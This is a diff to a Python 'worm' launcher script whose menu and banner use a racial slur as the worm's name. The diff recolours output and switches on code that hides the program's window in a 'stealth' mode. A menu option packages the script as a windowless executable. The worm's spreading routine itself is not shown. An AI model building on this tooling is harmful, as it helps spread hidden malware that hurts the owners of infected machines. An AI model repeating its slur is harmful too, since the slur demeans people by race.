@@ -8,9 +8,21 @@ import win32gui
 import helikopter
 from os import system
 
+
+#function defined for colouring
+def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
+def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
+def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))
+def prLightPurple(skk): print("\033[94m {}\033[00m" .format(skk))
+def prPurple(skk): print("\033[95m {}\033[00m" .format(skk))
+def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
+def prLightGray(skk): print("\033[97m {}\033[00m" .format(skk))
+def prBlack(skk): print("\033[98m {}\033[00m" .format(skk))
+
+
 #function to print banner
 def banner_func():
-	print ("""
+	prCyan ("""
 	         _____     _   _         _   _ _                       
 		|  ___|_ _| |_| |_ _   _| \ | (_) __ _  __ _  ___ _ __ 
 		| |_ / _` | __| __| | | |  \| | |/ _` |/ _` |/ _ \ '__|
@@ -102,14 +114,14 @@ def execute_worm():
 
 #menu function of worm
 def worm_menu():
-	print(' --------------------------------- ')
-	print('|      F A T T Y N I G G E R      |')
-	print(' --------------------------------- ')
-	print('| [+] 1 => Launch Worm!		 |')
-	print('| [+] 2 => Make It Executable!    |')
-	print('| [+] 3 => Run Worm in Stealth!   |')
-	print('| [!] 0 => Exit!                  |')
-	print(' --------------------------------- ')
+	prPurple(' --------------------------------- ')
+	prPurple('|      F A T T Y N I G G E R      |')
+	prPurple(' --------------------------------- ')
+	prPurple('| [+] 1 => Launch Worm!           |')
+	prPurple('| [+] 2 => Make It Executable!    |')
+	prPurple('| [+] 3 => Run Worm in Stealth!   |')
+	prPurple('| [!] 0 => Exit!                  |')
+	prPurple(' --------------------------------- ')
 
   	        
 #main function in python                        
@@ -136,48 +148,49 @@ if __name__=="__main__":
 		
 		#operation to perform
 		if opt == 1:
-			print('[!] WORM FattyNigger Started!')
+			prRed('[!] WORM FattyNigger Started!')
 			try:
 				execute_worm()
 			except KeyboardInterrupt:
 				inpt=input('You want to Stop Worm?[y/n]: ')
 				if inpt == 'y':
-					print('[-] Stopping Worm!')
+					prGreen('[-] Stopping Worm!')
 					break
 				else:
-					print('[+] Worm Spreads!')
+					prRed('[+] Worm Spreads!')
 					continue
 				
 		elif opt == 2:
-			print('[+] Creating EXE of WORM FattyNigger.py!')
+			prGreen('[+] Creating EXE of WORM FattyNigger.py!')
 			time.sleep(2)
+			
 			os.system('pytinstaller fattynigger.py --onefile --noconsole')
-			print('[!] fattynigger.exe Created!')
+			prLightGray('[!] fattynigger.exe Created!')
 		
 		elif opt == 3:
-			print('[!] Running Worm in Stealth Mode') 
+			prYellow('[!] Running Worm in Stealth Mode') 
 			time.sleep(2)
-			#hide=win32gui.GetForegroundWindow()
-			#win32gui.ShowWindow(hide, win32con.SW_HIDE)
+			hide=win32gui.GetForegroundWindow()
+			win32gui.ShowWindow(hide, win32con.SW_HIDE)
 			try:
 				execute_worm()
 			except KeyboardInterrupt:
 				inpt=input('You want to Stop Worm?[y/n]: ')
 				if inpt == 'y':
-					print('[-] Stopping Worm!')
+					prGreen('[-] Stopping Worm!')
 					break
 				else:
-					print('[+] Worm Spreads!')
+					prRed('[+] Worm Spreads!')
 					continue
 			
 		elif opt == 0:
-			print('[!] Quitting...')
+			prRed('[!] Quitting...')
 			time.sleep(1.5)
 			break
 					
 		else:
-			print('[!] Invalid Option.')
-			print('[!] Try Again. ')
+			prLightGray('[!] Invalid Option.')
+			prBlack('[!] Try Again. ')
 
 			
 #going back to main tool			
